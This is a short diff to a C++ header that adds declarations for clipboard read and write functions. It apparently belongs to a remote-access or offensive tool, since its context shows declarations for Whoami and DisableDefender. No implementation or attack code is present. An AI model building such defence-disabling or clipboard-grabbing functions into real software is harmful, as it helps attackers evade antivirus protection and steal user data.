@@ -79,4 +79,14 @@ std::string Whoami();
 */
 BOOL DisableDefender();
 
+/**
+ * Gets the text contents of the clipboard, if any
+*/
+std::string GetClipboard();
+
+/**
+ * Sets the text contents of the clipboard to `contents`
+*/
+void SetClipboard(std::string contents);
+
 #endif
